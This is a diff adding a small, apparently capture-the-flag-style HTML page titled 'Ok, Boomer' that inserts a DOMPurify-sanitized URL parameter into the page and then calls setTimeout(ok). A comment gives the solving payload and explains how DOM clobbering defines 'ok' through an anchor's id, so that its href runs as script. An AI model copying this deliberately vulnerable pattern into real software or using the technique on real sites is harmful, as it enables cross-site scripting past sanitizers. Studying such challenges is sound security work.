@@ -1,0 +1,14 @@
+<h2 id="boomer">Ok, Boomer.</h2>
+<script>
+    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get('boomer') || "Ok, Boomer")
+    setTimeout(ok, 2000)
+</script>
+
+<!--
+    ?boomer=<a%20id=ok%20href=tel:alert(1337)>
+    ok is used. The attacking payload defines ok by injecting
+     an anchor element whose id is ok. A browser automatically creates
+     ok variable upon seeing the id.
+    ok is not callable, then toString() is called, The result is treated
+     as a callable function.
+-->
